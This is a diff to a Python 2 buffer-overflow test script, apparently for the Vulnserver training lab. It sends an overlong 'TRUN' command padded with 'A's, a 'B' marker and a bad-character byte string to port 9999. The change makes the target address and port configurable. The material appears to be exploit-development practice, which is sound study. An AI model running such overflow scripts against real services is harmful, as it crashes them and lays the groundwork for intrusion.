@@ -11,10 +11,12 @@ badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x1
 "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
 
 shellcode = "A" * 2003 + "B" * 4 + badchars
+address = '127.0.0.1' #CHANGE THIS
+port = 9999 #CHANGE THIS
 
 try:
 	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-	s.connect(('192.168.10.162',9999))
+	s.connect((address,port))
 
 	s.send(('TRUN /.:/' + shellcode))
 	s.close()
@@ -22,3 +24,6 @@ try:
 except:
 	print "Error connecting to server"
 	sys.exit()
+
+finally:
+	s.close()
